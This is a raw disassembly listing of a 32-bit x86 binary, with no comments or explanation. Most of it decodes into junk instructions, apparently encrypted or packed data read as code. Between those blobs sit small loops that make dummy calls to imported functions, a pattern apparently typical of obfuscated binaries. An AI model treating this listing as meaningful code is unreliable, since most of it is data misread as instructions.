  40b06a:	bound  esp,QWORD PTR [edi+edx*8+0x38d54bc3]
  40b071:	pusha  
  40b072:	sbb    BYTE PTR [esi],cl
  40b074:	rcl    DWORD PTR [edx-0x368e9110],cl
  40b07a:	pop    es
  40b07b:	fst    DWORD PTR [ecx+ecx*2-0x5607152d]
  40b082:	leave  
  40b083:	lahf   
  40b084:	xchg   ebp,eax
  40b085:	ins    BYTE PTR es:[edi],dx
  40b086:	pop    edx
  40b087:	xchg   edx,eax
  40b088:	arpl   ax,bp
  40b08a:	cmc    
  40b08b:	mov    ch,0x31
  40b08d:	fnstsw WORD PTR [eax+0x54]
  40b090:	shl    BYTE PTR [edx+0x43b12527],cl
  40b096:	cmp    eax,0x9fe3869
  40b09b:	dec    ecx
  40b09c:	xor    eax,edx
  40b09e:	xor    esi,edx
  40b0a0:	add    eax,ecx
  40b0a2:	add    esi,ecx
  40b0a4:	imul   eax,esi
  40b0a7:	mov    esi,DWORD PTR [ebp+0xc]
  40b0aa:	cmp    esi,eax
  40b0ac:	mov    eax,DWORD PTR [ebp-0x4]
  40b0af:	je     0x40aa89
  40b0b5:	xor    eax,edx
  40b0b7:	add    eax,ecx
  40b0b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40b0bc:	imul   eax,ecx
  40b0bf:	add    eax,DWORD PTR [ebp+0x8]
  40b0c2:	mov    DWORD PTR [ebp+0xc],eax
  40b0c5:	mov    eax,DWORD PTR [ebp+0xc]
  40b0c8:	jmp    0x40b2c3
  40b0cd:	fadd   QWORD PTR [edi-0x18]
  40b0d0:	(bad)  
  40b0d1:	ins    DWORD PTR es:[edi],dx
  40b0d2:	jns    0x40b0d0
  40b0d4:	pop    ebp
  40b0d5:	xchg   BYTE PTR [ebx+0xb],cl
  40b0d8:	xor    cl,BYTE PTR [esi-0x62fd782d]
  40b0de:	loop   0x40b15e
  40b0e0:	jle    0x40b13e
  40b0e2:	jg     0x40b162
  40b0e4:	jle    0x40b10c
  40b0e6:	test   BYTE PTR [esi-0x1997461c],ah
  40b0ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0ed:	ror    DWORD PTR [ebx],1
  40b0ef:	leave  
  40b0f0:	sub    al,0x7e
  40b0f2:	inc    esi
  40b0f3:	dec    esp
  40b0f4:	inc    ebp
  40b0f5:	(bad)  
  40b0f6:	int    0x38
  40b0f8:	and    ecx,DWORD PTR ds:0x14fd6c7d
  40b0fe:	fwait
  40b0ff:	sar    DWORD PTR [edx+ecx*4-0x76c276be],cl
  40b106:	cmp    ebp,DWORD PTR [ecx-0x57]
  40b109:	pop    esi
  40b10a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b10b:	bound  ebp,QWORD PTR [eax]
  40b10d:	or     ebx,DWORD PTR [edx+eax*4]
  40b110:	xchg   BYTE PTR [ebx+0x9fc7284],bl
  40b116:	jne    0x40b194
  40b118:	in     eax,dx
  40b119:	add    eax,eax
  40b11b:	lahf   
  40b11c:	and    eax,0xd8c5b03a
  40b121:	call   esi
  40b123:	rol    BYTE PTR [esi+0x6264091],1
  40b129:	push   ebx
  40b12a:	adc    al,0x46
  40b12c:	sbb    BYTE PTR [ebp+0x35],cl
  40b12f:	scas   al,BYTE PTR es:[edi]
  40b130:	mov    ah,0xf5
  40b132:	repnz loopne 0x40b0fc
  40b135:	xchg   esi,eax
  40b136:	fild   DWORD PTR [ebx+0x17ac80aa]
  40b13c:	mov    bh,0x61
  40b13e:	mov    DWORD PTR [ebx-0x6c],0x6e552bbf
  40b145:	cmp    eax,0x2e3b3685
  40b14a:	push   es
  40b14b:	mov    ebp,0x79f63b9b
  40b150:	inc    ecx
  40b151:	adc    al,0x90
  40b153:	xchg   edx,ecx
  40b155:	fisttp WORD PTR [eax-0x57]
  40b158:	es push 0xc3b8b35e
  40b15e:	inc    ecx
  40b15f:	fmulp  st(3),st
  40b161:	outs   dx,BYTE PTR ds:[esi]
  40b162:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b163:	js     0x40b116
  40b165:	cmp    cl,BYTE PTR [ecx+0x7e]
  40b168:	inc    ebp
  40b169:	stc    
  40b16a:	adc    edi,ebx
  40b16c:	out    0x66,eax
  40b16e:	loop   0x40b12b
  40b170:	sub    al,0xad
  40b172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b173:	jne    0x40b1b6
  40b175:	call   0xf02d:0x347431c9
  40b17c:	int3   
  40b17d:	jl     0x40b1d0
  40b17f:	bound  ebp,QWORD PTR [eax+0xc914017]
  40b185:	(bad)  
  40b186:	xor    ebx,DWORD PTR ds:0x9376d60f
  40b18c:	push   0x5bc83993
  40b191:	push   esi
  40b192:	sbb    eax,0xbea8bc07
  40b197:	xlat   BYTE PTR ds:[ebx]
  40b198:	enter  0x7029,0x54
  40b19c:	stc    
  40b19d:	dec    ecx
  40b19e:	dec    ebp
  40b19f:	lds    ebx,FWORD PTR [edi+0x41]
  40b1a2:	scas   al,BYTE PTR es:[edi]
  40b1a3:	cdq    
  40b1a4:	dec    edi
  40b1a5:	and    DWORD PTR [ebp-0x5607c9e9],0x36b377d7
  40b1af:	or     eax,0xa3bc26f1
  40b1b4:	xor    esi,DWORD PTR [ebx-0x43]
  40b1b7:	mov    eax,0xc90223ef
  40b1bc:	fimul  WORD PTR [ecx+0xe]
  40b1bf:	add    al,0x17
  40b1c1:	inc    ecx
  40b1c2:	js     0x40b179
  40b1c4:	xchg   esi,eax
  40b1c5:	std    
  40b1c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1c7:	lea    edi,ds:0xb1d0d08e
  40b1cd:	mov    ecx,0x7445197f
  40b1d2:	bound  ecx,QWORD PTR [eax+0x4b]
  40b1d5:	jae    0x40b160
  40b1d7:	jp     0x40b1db
  40b1d9:	jmp    0x40b19e
  40b1db:	je     0x40b22a
  40b1dd:	int    0x94
  40b1df:	ret    0xe7a5
  40b1e2:	out    dx,al
  40b1e3:	mov    al,0x21
  40b1e5:	mov    dl,0xc3
  40b1e7:	dec    edx
  40b1e8:	pushf  
  40b1e9:	mov    ds:0x3a0dc69b,eax
  40b1ee:	loop   0x40b1bd
  40b1f0:	mov    al,ds:0x29fe02e
  40b1f5:	xchg   ecx,eax
  40b1f6:	xlat   BYTE PTR ds:[ebx]
  40b1f7:	jp     0x40b191
  40b1f9:	int3   
  40b1fa:	fisub  WORD PTR [edi+0x1b]
  40b1fd:	adc    ebp,DWORD PTR [ecx]
  40b1ff:	out    dx,eax
  40b200:	pop    ss
  40b201:	clc    
  40b202:	daa    
  40b203:	or     DWORD PTR [esi+eax*8+0x1bedbb1a],ebp
  40b20a:	dec    edx
  40b20b:	inc    ecx
  40b20c:	dec    edx
  40b20d:	imul   edx,DWORD PTR [ecx],0xb2a16f78
  40b213:	repnz hlt 
  40b215:	loop   0x40b1de
  40b217:	popa   
  40b218:	mov    bh,0x43
  40b21a:	addr16 popa 
  40b21c:	into   
  40b21d:	and    bh,BYTE PTR [edx-0x54]
  40b220:	jmp    DWORD PTR [ecx]
  40b222:	fild   QWORD PTR [ecx]
  40b224:	fdivr  DWORD PTR [eax-0x169ce9e8]
  40b22a:	ror    BYTE PTR [eax+eax*1],1
  40b22d:	daa    
  40b22e:	scas   al,BYTE PTR es:[edi]
  40b22f:	inc    esi
  40b230:	aaa    
  40b231:	sub    DWORD PTR [edx],esp
  40b233:	out    dx,eax
  40b234:	xchg   DWORD PTR [ecx-0x5f],edi
  40b237:	fnstenv [eax-0x50]
  40b23a:	dec    ecx
  40b23b:	and    BYTE PTR [esi+0x7e],bh
  40b23e:	cmp    al,0x9c
  40b240:	add    eax,0x4fc575be
  40b245:	cs cmc 
  40b247:	jle    0x40b21e
  40b249:	out    0x18,al
  40b24b:	in     eax,dx
  40b24c:	out    0x68,al
  40b24e:	sub    BYTE PTR [ebx+0x5b9e912c],bh
  40b254:	shl    BYTE PTR [eax-0x7d5a75a8],1
  40b25a:	push   edx
  40b25b:	xor    DWORD PTR [esp+edi*8+0x5ddfb60c],edi
  40b262:	repz xchg esp,eax
  40b264:	mov    esi,0x70c47d3c
  40b269:	sub    edi,DWORD PTR [eax-0x58]
  40b26c:	cmp    dh,BYTE PTR [ebx-0x6f2cc512]
  40b272:	stc    
  40b273:	xchg   esi,eax
  40b274:	jns    0x40b245
  40b276:	cmc    
  40b277:	dec    ebx
  40b278:	ror    DWORD PTR [eax-0x8],1
  40b27b:	pusha  
  40b27c:	cmp    eax,0x83948ed3
  40b281:	cmp    eax,0xaf595040
  40b286:	(bad)  
  40b287:	cmp    al,0xd4
  40b289:	or     BYTE PTR [ecx+0x1ce1688b],dl
  40b28f:	ficom  WORD PTR [eax+ecx*4]
  40b292:	xchg   esp,eax
  40b293:	sbb    ecx,esp
  40b295:	popa   
  40b296:	ror    DWORD PTR [ebx+0x11a70de9],0x59
  40b29d:	pop    ecx
  40b29e:	shl    BYTE PTR [eax+0x30cbeb19],1
  40b2a4:	mov    ah,0x37
  40b2a6:	test   eax,0x8a64a7c7
  40b2ab:	inc    eax
  40b2ac:	ficomp WORD PTR [eax+0x24]
  40b2af:	clc    
  40b2b0:	mov    dh,dh
  40b2b2:	adc    esi,DWORD PTR [ecx+esi*2-0x16e22f4e]
  40b2b9:	xor    dl,BYTE PTR [eax-0x6e]
  40b2bc:	add    dl,BYTE PTR [ebp+0x29810997]
  40b2c2:	popf   
  40b2c3:	pop    esi
  40b2c4:	leave  
  40b2c5:	ret    0x8
  40b2c8:	push   ebp
  40b2c9:	mov    ebp,esp
  40b2cb:	sub    esp,0x30
  40b2ce:	mov    eax,ds:0x4305ee
  40b2d3:	mov    ecx,DWORD PTR ds:0x4305fa
  40b2d9:	sub    ecx,eax
  40b2db:	imul   eax,DWORD PTR [eax+ecx*1]
  40b2df:	jmp    0x40b43d
  40b2e4:	adc    eax,0x6533e552
  40b2e9:	inc    ebp
  40b2ea:	and    eax,0x241ce54
  40b2ef:	scas   al,BYTE PTR es:[edi]
  40b2f0:	pop    edx
  40b2f1:	and    eax,0xe4fbfdee
  40b2f6:	jle    0x40b376
  40b2f8:	aas    
  40b2f9:	jg     0x40b379
  40b2fb:	jle    0x40b354
  40b2fd:	mov    ds:0xf889be9f,al
  40b302:	ds jne 0x40b2bc
  40b305:	jle    0x40b2f6
  40b307:	adc    eax,0xc6a50ab7
  40b30c:	mov    esi,0xf1a77c14
  40b311:	ja     0x40b36d
  40b313:	jo     0x40b2ef
  40b315:	xor    eax,0x6f10b976
  40b31a:	lods   al,BYTE PTR ds:[esi]
  40b31b:	inc    esp
  40b31c:	loope  0x40b371
  40b31e:	outs   dx,DWORD PTR ds:[esi]
  40b31f:	push   0xb
  40b321:	imul   esi,DWORD PTR [esi],0x4e
  40b324:	mov    ecx,0xaddec058
  40b329:	je     0x40b314
  40b32b:	ins    BYTE PTR es:[edi],dx
  40b32c:	(bad)
  40b330:	inc    edi
  40b331:	out    0xbf,eax
  40b333:	jg     0x40b39e
  40b335:	dec    esp
  40b336:	bnd jl 0x40b347
  40b339:	mov    eax,0x7dded4da
  40b33e:	aam    0xe0
  40b340:	push   DWORD PTR [edx-0x28]
  40b343:	dec    ecx
  40b344:	jmp    0x9d0e4f0b
  40b349:	pushf  
  40b34a:	pop    es
  40b34b:	jecxz  0x40b31b
  40b34d:	pop    ds
  40b34e:	fsubr  DWORD PTR [eax+0x495b0a88]
  40b354:	int    0x60
  40b356:	xor    BYTE PTR [ebx-0x48],0x94
  40b35a:	mov    ebx,0x1a47f0cf
  40b35f:	hlt    
  40b360:	fwait
  40b361:	pop    ebx
  40b362:	sbb    ebx,DWORD PTR [edi+0x5b176fb0]
  40b368:	pushf  
  40b369:	scas   eax,DWORD PTR es:[edi]
  40b36a:	add    ecx,DWORD PTR [esi-0x71]
  40b36d:	adc    edi,ebx
  40b36f:	add    ebp,esi
  40b371:	add    DWORD PTR [eax-0x67a0fa04],esi
  40b377:	fwait
  40b378:	aad    0xdf
  40b37a:	je     0x40b33c
  40b37c:	jb     0x40b349
  40b37e:	ficom  WORD PTR ds:0x43a642c1
  40b384:	sbb    al,0xc5
  40b386:	out    dx,eax
  40b387:	add    ebx,esp
  40b389:	xchg   edx,eax
  40b38a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b38b:	cmp    BYTE PTR [edi+0x266dea17],0xd9
  40b392:	sti    
  40b393:	mov    ah,0xda
  40b395:	push   0x18
  40b397:	xchg   ebp,eax
  40b398:	mov    ebx,0xb44889a6
  40b39d:	mov    esi,edx
  40b39f:	sbb    al,dl
  40b3a1:	add    BYTE PTR [ebx+0x179195f6],bh
  40b3a7:	fldcw  WORD PTR [eax+0x527e117f]
  40b3ad:	dec    eax
  40b3ae:	sub    BYTE PTR [esi+0xab8580],ah
  40b3b4:	(bad)  
  40b3b5:	imul   ebx,DWORD PTR [edx+0x62599876],0x2f3c51f2
  40b3bf:	pop    esi
  40b3c0:	mov    ecx,0xabc05daa
  40b3c5:	jp     0x40b3a6
  40b3c7:	mov    esp,0x81a786a6
  40b3cc:	dec    edx
  40b3cd:	xor    cl,BYTE PTR [esi+0x4a2e7267]
  40b3d3:	test   BYTE PTR [ebp+eiz*4+0x77],cl
  40b3d7:	repz das 
  40b3d9:	mov    ds:0x3086a32f,al
  40b3de:	rcr    DWORD PTR [esi+0x9],cl
  40b3e1:	dec    eax
  40b3e2:	ret    0x487e
  40b3e5:	mov    dl,0x92
  40b3e7:	icebp  
  40b3e8:	icebp  
  40b3e9:	addr16 ret 
  40b3eb:	and    BYTE PTR [ecx+0x55],cl
  40b3ee:	shl    DWORD PTR [edi-0x1e],0x31
  40b3f2:	push   eax
  40b3f3:	ja     0x40b405
  40b3f5:	out    dx,eax
  40b3f6:	jp     0x40b390
  40b3f8:	jecxz  0x40b436
  40b3fa:	mov    esi,0xa400eab4
  40b3ff:	mov    ch,0xbd
  40b401:	jge    0x40b3d4
  40b403:	mov    cl,0x9f
  40b405:	push   edi
  40b406:	dec    eax
  40b407:	jno    0x40b3ea
  40b409:	imul   ecx,DWORD PTR [eax],0x303e340e
  40b40f:	scas   al,BYTE PTR es:[edi]
  40b410:	(bad)  
  40b411:	pop    edx
  40b412:	(bad)  
  40b414:	sbb    al,0x2f
  40b416:	mov    DWORD PTR [ebp-0x59],ebp
  40b419:	mov    edx,0xc1024798
  40b41e:	jbe    0x40b45f
  40b420:	jno    0x40b3d5
  40b422:	and    eax,DWORD PTR [eax+0xc]
  40b425:	fcomp  DWORD PTR [edx-0x72]
  40b428:	add    al,0xb7
  40b42a:	mov    bl,0xdc
  40b42c:	or     ebp,DWORD PTR [ebp-0xde04ebf]
  40b432:	jbe    0x40b494
  40b434:	jns    0x40b48a
  40b436:	push   0xffffffe6
  40b438:	lahf   
  40b439:	aam    0xc9
  40b43b:	inc    ecx
  40b43c:	retf   0x45c7
  40b43f:	cld    
  40b440:	xor    eax,0xc7f89c85
  40b445:	add    eax,0x4305ce
  40b44a:	adc    DWORD PTR [eax],eax
  40b44c:	add    BYTE PTR [eax],al
  40b44e:	cmp    DWORD PTR ds:0x4305ce,0x0
  40b455:	je     0x40b489
  40b45b:	cmp    DWORD PTR ds:0x4305ce,0x19
  40b462:	jne    0x40b479
  40b468:	push   DWORD PTR [ebp-0x24]
  40b46b:	push   DWORD PTR [ebp-0x20]
  40b46e:	push   0x41ff
  40b473:	call   DWORD PTR ds:0x42eb68
  40b479:	mov    eax,ds:0x4305ce
  40b47e:	dec    eax
  40b47f:	mov    ds:0x4305ce,eax
  40b484:	jmp    0x40b44e
  40b489:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40b490:	or     eax,0x1c5c
  40b495:	mov    ecx,DWORD PTR [ebp-0x4]
  40b498:	push   ebx
  40b499:	add    DWORD PTR ds:0x43052e,edi
  40b49f:	mov    eax,0x7510856
  40b4a4:	mov    ebx,DWORD PTR ds:0x4305c2
  40b4aa:	sbb    DWORD PTR ds:0x42e7e2,ebx
  40b4b0:	xor    ecx,eax
  40b4b2:	mov    ebx,DWORD PTR ds:0x42ee94
  40b4b8:	sub    DWORD PTR ds:0x43050e,ebx
  40b4be:	mov    ebx,0x32729d
  40b4c3:	xor    DWORD PTR ds:0x4305c6,0xece
  40b4cd:	add    ecx,ebx
  40b4cf:	xor    DWORD PTR ds:0x430516,0x42e7ea
  40b4d9:	mov    DWORD PTR [ebp-0x1c],ecx
  40b4dc:	mov    ecx,DWORD PTR [ebp+0x14]
  40b4df:	xor    DWORD PTR ds:0x42ee9c,0x65f3
  40b4e9:	push   esi
  40b4ea:	sub    DWORD PTR ds:0x42e7e2,0x2022
  40b4f4:	push   edi
  40b4f5:	and    DWORD PTR ds:0x4305c6,0x430512
  40b4ff:	test   ecx,ecx
  40b501:	mov    DWORD PTR ds:0x42e7de,0x17b6
  40b50b:	je     0x40b58a
  40b511:	add    ecx,0x2345
  40b517:	mov    ecx,DWORD PTR [ebp+0x14]
  40b51a:	and    DWORD PTR ds:0x430526,0x0
  40b524:	jmp    0x40b536
  40b529:	mov    edi,DWORD PTR ds:0x430526
  40b52f:	inc    edi
  40b530:	mov    DWORD PTR ds:0x430526,edi
  40b536:	cmp    DWORD PTR ds:0x430526,0x1d
  40b53d:	jae    0x40b585
  40b543:	cmp    DWORD PTR ds:0x430526,0x4
  40b54a:	jne    0x40b560
  40b550:	push   0x42ee9c
  40b555:	push   0x6d9e
  40b55a:	call   DWORD PTR ds:0x42eb6c
  40b560:	cmp    DWORD PTR ds:0x430526,0x3
  40b567:	jne    0x40b57a
  40b56d:	mov    edi,DWORD PTR ds:0x430526
  40b573:	inc    edi
  40b574:	mov    DWORD PTR ds:0x430526,edi
  40b57a:	jmp    0x40b529
  40b57f:	and    esi,0x3dcd
  40b585:	mov    ecx,DWORD PTR [ecx]
  40b587:	mov    DWORD PTR [ebp-0x1c],ecx
  40b58a:	movzx  esi,BYTE PTR ds:0x430512
  40b591:	xor    DWORD PTR ds:0x43053a,esi
  40b597:	imul   edx,eax
  40b59a:	or     DWORD PTR ds:0x43053e,edx
  40b5a0:	mov    ecx,0x4573
  40b5a5:	xor    esi,DWORD PTR ds:0x430506
  40b5ab:	add    edx,ecx
  40b5ad:	mov    esi,0x7879
  40b5b2:	and    DWORD PTR ds:0x4305be,0x0
  40b5bc:	mov    edi,DWORD PTR ds:0x4305be
  40b5c2:	inc    edi
  40b5c3:	mov    DWORD PTR ds:0x4305be,edi
  40b5c9:	cmp    DWORD PTR ds:0x4305be,0x12
  40b5d0:	jne    0x40b5f7
  40b5d6:	push   0x1
  40b5d8:	push   0x3333
  40b5dd:	push   0x7164
  40b5e2:	push   0x26d7
  40b5e7:	push   0x1d14
  40b5ec:	push   0x64d6
  40b5f1:	call   DWORD PTR ds:0x42eb70
  40b5f7:	cmp    DWORD PTR ds:0x4305be,0x11
  40b5fe:	jne    0x40b613
  40b604:	xor    edi,edi
  40b606:	or     edi,DWORD PTR ds:0x4305be
  40b60c:	inc    edi
  40b60d:	mov    DWORD PTR ds:0x4305be,edi
  40b613:	cmp    DWORD PTR ds:0x4305be,0x1f
  40b61a:	jb     0x40b5bc
  40b620:	dec    edi
  40b621:	mov    edi,0x1556
  40b626:	xchg   esi,ecx
  40b628:	sub    edx,edi
  40b62a:	xor    esi,esi
  40b62c:	jmp    0x40b78a
  40b631:	mov    ch,dh
  40b633:	add    esi,DWORD PTR [eax+0x7b]
  40b636:	aad    0x9d
  40b638:	jl     0x40b646
  40b63a:	mov    eax,0x29b74dc4
  40b63f:	mov    ebx,0x7ee5bc5f
  40b644:	jle    0x40b685
  40b646:	jg     0x40b6c6
  40b648:	jle    0x40b6af
  40b64a:	loopne 0x40b68a
  40b64c:	mov    eax,0x9b9ad404
  40b651:	push   ds
  40b652:	in     eax,0x88
  40b654:	dec    eax
  40b655:	ja     0x40b66c
  40b657:	jne    0x40b6a3
  40b659:	inc    ecx
  40b65a:	enter  0xb15d,0xdc
  40b65e:	fisubr DWORD PTR [edi]
  40b660:	and    BYTE PTR [ecx],ch
  40b662:	cmp    ecx,DWORD PTR [edi-0x4effc52f]
  40b668:	scas   al,BYTE PTR es:[edi]
  40b669:	lods   al,BYTE PTR ds:[esi]
  40b66a:	push   edx
  40b66b:	and    cl,BYTE PTR [ebx+0x4a4e5ddb]
  40b671:	mov    DWORD PTR [edi-0x4c],eax
  40b674:	or     BYTE PTR [edi-0x117b8afd],dl
  40b67a:	(bad)  
  40b67b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b67c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b67d:	push   es
  40b67e:	test   BYTE PTR [esi-0x4540e2cf],0x55
  40b685:	mov    ebx,0x9d93123
  40b68a:	adc    bh,BYTE PTR [edi]
  40b68c:	mov    esi,0xc785b4c1
  40b691:	jo     0x40b626
  40b693:	rol    DWORD PTR [esp+ebp*4],0x9e
  40b697:	popf   
  40b698:	inc    ebx
  40b699:	jb     0x40b632
  40b69b:	fwait
  40b69c:	ja     0x40b6a6
  40b69e:	cs hlt 
  40b6a0:	sbb    eax,0xd85b4d9d
  40b6a5:	and    BYTE PTR [ebx],0x2c
  40b6a8:	loopne 0x40b6f5
  40b6aa:	add    ebp,DWORD PTR [eax+ecx*4-0x7f]
  40b6ae:	mov    dh,0x9a
  40b6b0:	xchg   esp,eax
  40b6b1:	test   al,0x94
  40b6b3:	jl     0x40b72c
  40b6b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6b6:	mov    cl,ah
  40b6b8:	jb     0x40b6a6
  40b6ba:	mov    eax,ds:0xf74644f0
  40b6bf:	ret    0x51d0
  40b6c2:	in     eax,0x38
  40b6c4:	dec    eax
  40b6c5:	lock sub esi,esp
  40b6c8:	lea    ebx,[ebp-0x700b8d3c]
  40b6ce:	outs   dx,DWORD PTR ds:[esi]
  40b6cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6d0:	dec    edi
  40b6d1:	arpl   WORD PTR [edx-0xf0700ec],sp
  40b6d7:	inc    edx
  40b6d8:	xchg   ecx,eax
  40b6d9:	mov    ?,WORD PTR [esi+eiz*1+0x48]
  40b6dd:	add    esp,DWORD PTR [eax+0x6af52d8c]
  40b6e3:	leave  
  40b6e4:	jnp    0x40b710
  40b6e6:	fwait
  40b6e7:	sbb    al,0x47
  40b6e9:	jbe    0x40b729
  40b6eb:	lea    eax,[ecx+0x7477bf68]
  40b6f1:	fidivr WORD PTR [ebp+0x2670353c]
  40b6f7:	dec    esp
  40b6f8:	inc    ecx
  40b6f9:	in     eax,0xb8
  40b6fb:	fdivr  QWORD PTR [esi]
  40b6fd:	or     al,0x57
  40b6ff:	jl     0x40b729
  40b701:	dec    eax
  40b702:	sub    ch,BYTE PTR [edx]
  40b704:	(bad)  
  40b707:	inc    ebp
  40b708:	out    0x78,al
  40b70a:	cdq    
  40b70b:	in     eax,0x76
  40b70d:	xchg   esp,eax
  40b70e:	mov    esp,0xae89219e
  40b713:	in     al,dx
  40b714:	sub    edx,DWORD PTR [edi-0x1b94f20d]
  40b71a:	jge    0x40b6d8
  40b71c:	fstp   DWORD PTR [edi]
  40b71e:	es retf 0x1c99
  40b722:	push   ebp
  40b723:	in     eax,0x79
  40b725:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b726:	aam    0x1f
  40b728:	push   esp
  40b729:	push   ebp
  40b72a:	sub    al,0xfe
  40b72c:	stos   WORD PTR es:[edi],ax
  40b72e:	xlat   BYTE PTR ds:[ebx]
  40b72f:	push   esp
  40b730:	adc    al,al
  40b732:	ficomp WORD PTR ds:0x4a9895ba
  40b738:	cmp    BYTE PTR [eax+eiz*8+0x711c2c1a],dl
  40b73f:	clc    
  40b740:	jle    0x40b79e
  40b742:	mov    DWORD PTR [ebx+ebx*4],esp
  40b745:	in     eax,0x94
  40b747:	scas   eax,DWORD PTR es:[edi]
  40b748:	xor    bh,cl
  40b74a:	mov    esi,DWORD PTR [edi]
  40b74c:	(bad)  ds:0x88c2f66f
  40b752:	scas   al,BYTE PTR es:[edi]
  40b753:	xchg   al,dl
  40b755:	loopne 0x40b6e2
  40b757:	jge    0x40b78b
  40b759:	mov    ch,0xc7
  40b75b:	fidivr DWORD PTR [ebx-0x57]
  40b75e:	add    dl,BYTE PTR [edi]
  40b760:	pop    ecx
  40b761:	and    cl,BYTE PTR [edi-0x5]
  40b764:	push   0xffffffdd
  40b766:	and    DWORD PTR [esi-0x442c63fc],ebx
  40b76c:	sbb    DWORD PTR [eax+edi*2+0x28],0x368a2b8f
  40b774:	xchg   edx,eax
  40b775:	or     al,0x47
  40b777:	pop    esp
  40b778:	xor    ecx,DWORD PTR [ebp-0x39]
  40b77b:	mov    ebx,0xca416f5f
  40b780:	aas    
  40b781:	fimul  DWORD PTR [edx-0xd]
  40b784:	test   BYTE PTR [ecx+0x2fd3d09f],cl
  40b78a:	mov    DWORD PTR [ebp-0x28],esi
  40b78d:	and    DWORD PTR ds:0x430532,ebx
  40b793:	mov    DWORD PTR [ebp-0x2c],esi
  40b796:	or     ecx,DWORD PTR ds:0x4305c2
  40b79c:	jmp    0x40b8fa
  40b7a1:	gs inc edi
  40b7a3:	xor    eax,0x657cedde
  40b7a8:	pop    ebp
  40b7a9:	xchg   edx,eax
  40b7aa:	lods   al,BYTE PTR ds:[esi]
  40b7ab:	mov    al,ds:0xb9a2fe97
  40b7b0:	cmp    BYTE PTR [ebp-0x1a],0x7e
  40b7b4:	jle    0x40b7f5
  40b7b6:	jg     0x40b836
  40b7b8:	jle    0x40b833
  40b7ba:	pop    edx
  40b7bb:	xchg   ecx,eax
  40b7bc:	dec    ecx
  40b7bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7be:	mov    ch,0x56
  40b7c0:	outs   dx,BYTE PTR ds:[esi]
  40b7c1:	cmp    al,0x6a
  40b7c3:	imul   ebx,DWORD PTR [ebx-0x64f40cbf],0x88433624
  40b7cd:	fpatan 
  40b7cf:	mov    bh,0x44
  40b7d1:	mov    edi,0x2784993a
  40b7d6:	mov    bh,0x54
  40b7d8:	mov    dl,0x98
  40b7da:	repz mov dl,0x58
  40b7dd:	aam    0x6a
  40b7df:	push   eax
  40b7e0:	adc    cl,BYTE PTR [eax*8-0x425040a9]
  40b7e7:	fdiv   DWORD PTR [edi+0x5c]
  40b7ea:	push   ds
  40b7eb:	mov    ebp,0xe4bfa632
  40b7f0:	and    al,0x4b
  40b7f2:	xor    eax,0x2e42b895
  40b7f7:	ins    BYTE PTR es:[edi],dx
  40b7f8:	and    DWORD PTR [esi-0x5af575f7],esi
  40b7fe:	xlat   BYTE PTR ds:[ebx]
  40b7ff:	test   al,0x6d
  40b801:	inc    edx
  40b802:	mov    edx,0xb78827ce
  40b807:	push   esp
  40b808:	and    al,0xad
  40b80a:	(bad)  
  40b80b:	hlt    
  40b80c:	outs   dx,BYTE PTR ds:[esi]
  40b80d:	sub    ah,BYTE PTR cs:[ebx+0x56]
  40b811:	pop    edx
  40b812:	(bad)  
  40b813:	mov    DWORD PTR [edx+ebp*2-0x2],edx
  40b817:	mov    WORD PTR [esi],?
  40b819:	(bad)  
  40b81b:	push   edi
  40b81c:	jmp    0x4137:0xb72a07f8
  40b823:	push   ecx
  40b824:	cmp    eax,0x7eb1d117
  40b829:	call   FWORD PTR [eax-0x72d3aa69]
  40b82f:	inc    edi
  40b830:	cdq    
  40b831:	jbe    0x40b7ce
  40b833:	data16 je 0x40b814
  40b836:	rcr    BYTE PTR [eax-0x57],1
  40b839:	jno    0x40b874
  40b83b:	scas   eax,DWORD PTR es:[edi]
  40b83c:	sub    eax,0xcfbc374b
  40b841:	lods   eax,DWORD PTR ds:[esi]
  40b842:	xor    BYTE PTR [edx],dl
  40b844:	add    BYTE PTR [edi+0x34],dl
  40b847:	aad    0x6a
  40b849:	shl    ch,cl
  40b84b:	ret    0xf4a3
  40b84e:	add    ecx,DWORD PTR [ebx]
  40b850:	cmp    al,0x66
  40b852:	or     al,0x21
  40b854:	pop    edx
  40b855:	das    
  40b856:	outs   dx,DWORD PTR ds:[esi]
  40b857:	jp     0x40b800
  40b859:	cmp    ecx,DWORD PTR [eax+0x6303f446]
  40b85f:	loopne 0x40b801
  40b861:	shl    ebx,cl
  40b863:	mov    dl,0x6f
  40b865:	adc    BYTE PTR [edx+esi*1+0x5b],bl
  40b869:	ins    BYTE PTR es:[edi],dx
  40b86a:	(bad)  [eax-0x1d0b9736]
  40b870:	vandnps xmm1,xmm0,XMMWORD PTR [esi]
  40b874:	mov    ds:0x337c92c1,eax
  40b879:	aam    0xb1
  40b87b:	xlat   BYTE PTR ds:[bx]
  40b87d:	mov    cl,0x64
  40b87f:	inc    eax
  40b880:	cdq    
  40b881:	das    
  40b882:	or     eax,0x3f537b8e
  40b887:	xor    al,0xf1
  40b889:	sbb    ecx,ecx
  40b88b:	aad    0x80
  40b88d:	adc    eax,DWORD PTR [edx+0x35]
  40b890:	jo     0x40b842
  40b892:	cwde   
  40b893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b894:	cmp    esp,DWORD PTR [edi]
  40b896:	cmp    al,0x3e
  40b898:	lock adc BYTE PTR [ebp-0x1e7d6506],dl
  40b89f:	mov    cl,0xf9
  40b8a1:	xor    BYTE PTR [esi-0xbe6ef93],ch
  40b8a7:	pop    es
  40b8a8:	push   edi
  40b8a9:	pop    edi
  40b8aa:	sub    eax,0x8a444443
  40b8af:	jb     0x40b838
  40b8b1:	mov    BYTE PTR [edi+0x2523c6ac],dl
  40b8b7:	test   ecx,ebx
  40b8b9:	(bad)  
  40b8ba:	enter  0x2e71,0xa8
  40b8be:	(bad)  
  40b8c0:	test   bh,cl
